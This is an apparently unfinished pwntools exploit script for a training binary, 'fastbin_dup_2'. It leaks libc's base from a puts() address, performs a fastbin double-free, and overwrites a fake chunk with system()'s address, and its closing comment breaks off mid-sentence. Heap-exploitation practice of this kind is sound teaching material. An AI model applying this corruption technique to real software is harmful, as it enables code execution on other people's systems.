#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

fake_fastbin_address = 0x7ffff7dd0b2d
fake_fastbin_size = 0x78

# Request two 0x50-sized chunks.
chunk_A = malloc(fake_fastbin_size-16, b"A"*8)
chunk_B = malloc(fake_fastbin_size-16, b"B"*8)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

chunk_C = malloc(fake_fastbin_size - 16, p64(fake_fastbin_address - 8))
chunk_D = malloc(fake_fastbin_size - 16, b"")
chunk_E = malloc(fake_fastbin_size - 16, p64(libc.sym.system))
# chunk_D = malloc(fake_fastbin_size - 16, b"")

# now we got 3 fastbins which 2 of them are the same, now we will allocate the same size to 


# =============================================================================

io.interactive()
